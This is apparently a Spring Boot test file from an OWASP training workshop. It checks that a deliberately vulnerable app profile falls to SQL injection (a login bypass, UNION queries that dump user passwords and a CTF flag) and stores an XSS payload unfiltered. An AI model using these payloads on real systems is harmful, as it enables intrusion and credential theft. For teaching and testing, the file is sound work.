package taller.owasp;

import static org.hamcrest.Matchers.containsString;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;

// M1 y M3: cada ataque del plan debe FUNCIONAR en el perfil vulnerable (3000).
@SpringBootTest(properties = "spring.datasource.url=jdbc:h2:mem:test-vuln;DB_CLOSE_DELAY=-1")
@AutoConfigureMockMvc
@ActiveProfiles("vulnerable")
class AtaquesVulnerableTest {

    @Autowired MockMvc mvc;

    @Test
    void loginConAdminComillaGuionesEntraSinContrasena() throws Exception {
        mvc.perform(post("/api/login").contentType(MediaType.APPLICATION_JSON)
                .content("{\"username\":\"admin' --\",\"password\":\"x\"}"))
           .andExpect(status().isOk())
           .andExpect(jsonPath("$.password").value("admin123"));
    }

    @Test
    void comillaSolaMuestraElErrorDeLaBase() throws Exception {
        mvc.perform(get("/api/products").param("q", "'"))
           .andExpect(status().isInternalServerError())
           .andExpect(content().string(containsString("SQL")));
    }

    @Test
    void unionDevuelveUsuariosYContrasenas() throws Exception {
        mvc.perform(get("/api/products").param("q", "' UNION SELECT id, username, password, 0 FROM users --"))
           .andExpect(content().string(containsString("admin123")));
    }

    @Test
    void retoCtfLeeLaBandera() throws Exception {
        mvc.perform(get("/api/products").param("q", "' UNION SELECT id, flag, '', 0 FROM secreto_ctf --"))
           .andExpect(content().string(containsString("FLAG{")));
    }

    @Test
    void comentarioGuardaElHtmlSinFiltrar() throws Exception {
        mvc.perform(post("/api/comments").contentType(MediaType.APPLICATION_JSON)
                .content("{\"author\":\"x\",\"content\":\"<img src=x onerror=alert(1)>\"}"))
           .andExpect(jsonPath("$.content").value("<img src=x onerror=alert(1)>"));
    }
}
